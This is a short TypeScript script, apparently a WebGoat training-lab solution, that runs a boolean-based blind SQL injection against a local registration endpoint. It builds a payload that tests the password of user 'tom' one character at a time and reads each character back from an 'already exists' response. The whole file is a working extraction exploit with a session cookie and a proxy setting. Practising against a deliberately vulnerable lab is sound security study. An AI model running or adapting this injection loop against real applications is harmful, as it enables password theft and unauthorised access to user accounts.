// https://www.youtube.com/watch?v=7LimarUJM-Y&t=451s

import { ProxyAgent, fetch } from "undici";

const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
const url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/register";
const JSESSIONID = "4F761BD22C1BBC3536455B945540501E"; // Update this with the actual JSESSIONID value.
const proxyAgent = new ProxyAgent("http://127.0.0.1:8081");

async function exploit() {
  let extractedPassword = "";

  while (true) {
    let position = extractedPassword.length + 1;
    let charFound = false;

    for (const char of alphabet) {
      const formData = new URLSearchParams();
      const payload = `tom' AND SUBSTRING(password, ${position}, 1) = '${char}`;
      formData.append("username_reg", payload);
      formData.append("email_reg", "test@google.com");
      formData.append("password_reg", "123");
      formData.append("confirm_password_reg", "123");

      try {
        const response = await fetch(url, {
          method: "PUT",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            Cookie: `JSESSIONID=${JSESSIONID}`,
          },
          body: formData.toString(),
          dispatcher: proxyAgent,
        });

        const result = (await response.json()) as { feedback?: string };
        if (result.feedback && result.feedback.includes("already exists")) {
          extractedPassword += char;
          console.log(`Password so far: ${extractedPassword}`);
          charFound = true;
          break;
        }
      } catch (error) {
        console.error(error);
      }
    }

    if (!charFound) {
      console.log("Finish");
      break;
    }
  }

  console.log(`Password: ${extractedPassword}`);
}

void exploit();
